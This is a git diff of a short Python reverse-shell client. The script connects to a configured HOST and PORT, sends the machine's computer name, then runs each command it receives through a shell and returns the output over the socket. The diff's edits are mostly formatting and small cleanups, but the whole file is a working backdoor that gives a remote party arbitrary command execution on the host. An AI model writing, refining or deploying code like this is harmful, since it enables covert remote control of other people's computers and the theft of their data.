@@ -8,7 +8,7 @@ def connect(host, port):
     os.system("cls")
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        print(f"[+] Trying to connect {host}:{port}")
+        print(f"[+] Trying to connect {host}: {port}")
         client.connect((HOST, PORT))
         print(f"[+] Conenction established.")
         client.send(os.environ["COMPUTERNAME"].encode(ENCODING))
@@ -27,20 +27,26 @@ def receive(client):
         os._exit(0)
     if response == 'quit':
         client.close()
+        print("[+] Exiting program...")
         os._exit(0)
     else:
-        shell = subprocess.Popen(response, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        shell = subprocess.Popen(
+            response, 
+            shell=True, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE, 
+            stdin=subprocess.PIPE
+            )
         stdout = shell.stdout.read() + shell.stderr.read()
         msg = str(stdout.decode('gbk')).encode(ENCODING)
         send(client, msg)
 
 def send(client, msg):
-    send = client.send(msg)
+    client.send(msg)
     receive(client)
 
 client = connect(HOST, PORT)
 receive(client)
-client.close()
 
 
 
